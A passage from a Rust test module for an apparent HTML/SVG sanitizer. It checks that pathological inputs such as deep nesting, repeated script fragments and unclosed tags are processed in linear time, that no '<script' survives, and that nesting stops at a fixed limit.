        assert_eq!(bounded("<svg><g><rect>"), "<svg><g><rect></rect></g></svg>");
    }

    /// Inputs that would be quadratic in a scanner that reads to the end
    /// for every token, at sizes where that would show as passes or
    /// output, never as time.
    #[test]
    fn long_inputs_stay_linear() {
        let n = 50_000;
        for markup in [
            "&".repeat(n),
            "&amp".repeat(n / 4),
            "<".repeat(n),
            "<a ".repeat(n / 3),
            format!("<p title=\"{}\">x</p>", "\"'&".repeat(n / 3)),
            format!("<rect data-at=\"{}", "9".repeat(n)),
            format!("<a {}>", "b ".repeat(n / 2)),
            format!("<script>{}", "<script".repeat(n / 7)),
            format!("<script>{}>", "</script<b".repeat(n / 10)),
            format!("<svg>{}", "<g>".repeat(n / 3)),
            format!("<svg>{}{}", "<g>".repeat(n / 6), "</x>".repeat(n / 8)),
            "<svg><foreignObject>".repeat(n / 20),
            "<svg><style>".repeat(n / 12),
            format!("<div style=\"{}\">", "a:b;/*".repeat(n / 6)),
            "<!--".repeat(n / 4),
        ] {
            let out = bounded(&markup);
            assert!(!out.to_ascii_lowercase().contains("<script"));
        }
        // Nesting past `MAX_OPEN` writes no more start tags.
        let deep = bounded(&format!("<svg>{}", "<g>".repeat(n / 3)));
        assert_eq!(deep.matches("<g>").count(), MAX_OPEN - 1);
        assert_eq!(deep.matches("</g>").count(), MAX_OPEN - 1);
    }
}
